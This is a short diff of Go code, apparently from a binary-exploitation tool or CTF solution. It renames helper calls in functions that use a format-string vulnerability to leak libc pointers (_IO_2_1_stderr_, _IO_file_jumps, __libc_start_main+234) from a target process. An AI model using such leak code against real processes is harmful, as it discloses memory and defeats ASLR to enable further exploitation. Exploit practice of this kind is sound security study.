@@ -57,7 +57,7 @@ func leakParams(proc *process.Process) {
 	})
 
 	if verbose != nil {
-		verbose.Printf("format string example: '%s'", leaker.FormatString(1))
+		verbose.Printf("format string example: '%s'", leaker.PointerFormatString(1))
 	}
 
 	log.Printf("press enter when ready")
@@ -68,9 +68,9 @@ func leakParams(proc *process.Process) {
 	// _IO_2_1_stderr_      - 0x7f7997d8e5c0 - 21
 	// _IO_file_jumps       - 0x7f7997d8f4a0 - 28
 	//__libc_start_main+234 - 0x7fa0bed99d0a - 45
-	_IO_2_1_stderr_ := leaker.MemoryAtParamOrExit(21)
-	_IO_file_jumps := leaker.MemoryAtParamOrExit(28)
-	__libc_start_main234 := pm.FromHexBytesOrExit(leaker.MemoryAtParamOrExit(45), binary.BigEndian)
+	_IO_2_1_stderr_ := leaker.RawPointerAtParamOrExit(21)
+	_IO_file_jumps := leaker.RawPointerAtParamOrExit(28)
+	__libc_start_main234 := pm.FromHexBytesOrExit(leaker.RawPointerAtParamOrExit(45), binary.BigEndian)
 
 	log.Printf("_IO_2_1_stderr_: %s | _IO_file_jumps %s | __libc_start_main 0x%x",
 		_IO_2_1_stderr_, _IO_file_jumps, __libc_start_main234.Uint()-234)
@@ -87,7 +87,7 @@ func leakLocalLibcSymbolParamNumbers(proc *process.Process) {
 	})
 
 	if verbose != nil {
-		verbose.Printf("format string exmple: '%s'", leaker.FormatString(1))
+		verbose.Printf("format string exmple: '%s'", leaker.PointerFormatString(1))
 	}
 
 	for {
